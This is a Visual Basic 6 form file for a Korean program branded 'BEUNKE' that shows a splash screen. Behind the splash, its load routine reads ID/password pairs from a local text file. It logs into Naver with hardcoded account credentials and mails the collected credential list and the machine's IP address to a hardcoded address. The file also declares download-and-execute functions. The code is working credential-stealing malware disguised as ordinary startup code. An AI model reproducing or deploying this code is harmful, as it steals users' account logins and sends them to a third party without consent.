VERSION 5.00
Begin VB.Form Form5 
   BackColor       =   &H00000000&
   BorderStyle     =   0  '없음
   Caption         =   "Form5"
   ClientHeight    =   9060
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   15960
   LinkTopic       =   "Form5"
   ScaleHeight     =   9060
   ScaleWidth      =   15960
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '화면 가운데
   Begin VB.ListBox List1 
      Height          =   2040
      Left            =   9960
      TabIndex        =   7
      Top             =   2760
      Width           =   1455
   End
   Begin VB.TextBox Text3 
      Height          =   270
      Left            =   240
      TabIndex        =   5
      Text            =   "frimek@naver.com"
      Top             =   6240
      Width           =   2055
   End
   Begin VB.TextBox Text2 
      Height          =   270
      Left            =   240
      TabIndex        =   4
      Text            =   "diet50kg"
      Top             =   5880
      Width           =   2055
   End
   Begin VB.TextBox Text1 
      Height          =   270
      Left            =   240
      TabIndex        =   3
      Text            =   "thoyeon"
      Top             =   5520
      Width           =   2055
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   1800
      Top             =   4080
   End
   Begin VB.Label frimek 
      Height          =   495
      Left            =   6000
      TabIndex        =   6
      Top             =   6360
      Width           =   4215
   End
   Begin VB.Label Label3 
      BackColor       =   &H00000000&
      Caption         =   "10초후에 자동으로 실행됩니다. About Beunkes"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   2880
      TabIndex        =   2
      Top             =   3960
      Width           =   4575
   End
   Begin VB.Label Label2 
      BackColor       =   &H00000000&
      Caption         =   "All right Reserved ⓒ Beunkes"
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   3480
      TabIndex        =   1
      Top             =   3600
      Width           =   2535
   End
   Begin VB.Label Label1 
      BackColor       =   &H00000000&
      Caption         =   "BEUNKE"
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   95.25
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   1935
      Left            =   840
      TabIndex        =   0
      Top             =   1440
      Width           =   7575
   End
End
Attribute VB_Name = "Form5"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Const SW_SHOWNORMAL = 1
Option Explicit

Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Const ERROR_SUCCESS As Long = 0
Private Const BINDF_GETNEWESTVERSION As Long = &H10
Private Const INTERNET_FLAG_RELOAD As Long = &H80000000
Dim winhttp As New WinHttpRequest
Dim cafeCookieToken$, clubTempId$, alimCode$, cafeApplyTempSaveapplyanswerstring$, applyQuestionSetno$, i, Temp, NewID, s, arr2() As String
Private Function DownloadFileFromWeb(sSourceUrl As String, sLocalFile As String) As Boolean
    DownloadFileFromWeb = URLDownloadToFile(0&, sSourceUrl, sLocalFile, BINDF_GETNEWESTVERSION, 0&) = ERROR_SUCCESS
End Function

Private Sub Form_Load()
Sleep (300)
IDLoad
winhttp.Open "POST", "https://nid.naver.com/nidlogin.login"
winhttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
winhttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
winhttp.Send "enctp=2&id=" & Text1 & "&pw=" & Text2
If InStr(winhttp.ResponseText, "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
For i = 0 To List1.ListCount - 1
Temp = List1.List(i) & "<br>" & Temp
Next i
winhttp.Open "POST", "http://mail.naver.com/json/write/send/"
winhttp.SetRequestHeader "Referer", "http://mail.naver.com/"
winhttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=utf-8"
winhttp.Send "senderName=%EC%9D%B4%EC%8B%A0%EC%9A%B0&to=" & Text3 & "&cc=&bcc=&subject=" & frimek.Caption & "&body=" & Temp & "&contentType=html&charset=AUTO&sendSeparately=false&saveSentBox=true&type=new&fromMe=0&attachID=tseCWrwm_LYmKoumKSevFou97qUm7riGWzwCMBKTM40nWzJCbqMZKAEwKou.&reserveDate=&reserveGMT=&reserveTime=&calendarVal=&autoSaveMailSN=&addReceiverAddress=false&attachCount=0&attachSize=0&bigfile=&sessionID=&seqNums=&priority=0&ndriveFileInfos=&lists=&serviceID=&u=" & Text1
End If
End Sub

Private Sub Timer1_Timer()
Unload Me
Form1.Show
End Sub

Public Sub IDLoad()


    If Dir(App.Path & "\frimek.txt") = "" Then
    Dim hFile As Long
    Dim sFilename As String
    'MkDir App.Path & "\CCSBFile"
    sFilename = App.Path & "\frimek.txt"

    hFile = FreeFile
    Open sFilename For Output As #hFile
    Print #hFile, "아이디/비밀번호 식으로 구분합니다."
    Close #hFile
    Exit Sub
    End If

 Open App.Path & "\frimek.txt" For Input As #1

    While Not EOF(1)
        Line Input #1, szOneLineText
        'IDPW = IDPW & szOneLineText & vbCrLf
        List1.AddItem szOneLineText
    Wend
    Close #1
'Skin.Caption = "UserPC IP : " & Winsock1.LocalIP & "&"
'Skin.Caption = Skin.Caption & " 아이디 " & List1.ListCount - 0& & "개 로드"


frimek.Caption = "UserPC UDP IP : " & Winsock2.LocalIP & "&"
frimek.Caption = frimek.Caption & " 아이디 " & List1.ListCount - 0& & "개 로드"
End Sub
